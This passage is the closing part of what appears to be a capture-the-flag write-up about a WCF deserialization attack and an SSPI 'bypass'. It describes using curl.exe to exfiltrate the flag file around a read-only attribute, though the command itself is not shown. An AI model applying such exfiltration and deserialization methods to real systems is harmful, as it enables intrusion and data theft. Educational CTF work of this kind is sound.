My solution was to use `curl.exe` (which is different from the `curl` PowerShell-cmdlet) to exfiltrate the flag. The `curl.exe` command is not affected by the read-only attribute of the file.

## Conclusion

Thank you for reading this far. There are probably countless ways to implement the solution, but I decided to go for the most educational approach, for your sake and mine. There was no intended way to solve the challenge, except for the deseriazliation attack as well as the SSPI "bypass". For a moment, I even considered making a TCP proxy to intercept the traffic between the client and server, but I decided I'd rather learn more about WCF and SSPI - but in a CTF, you might not have the luxury of time.

I hope you learned something new, and that you enjoyed the challenge and writeup.

If you have any questions or feedback, feel free to reach out to me on X/Twitter ([@ly4k_](https://twitter.com/ly4k_)), Discord, or whichever way you can find me*.

*Limitations may apply.
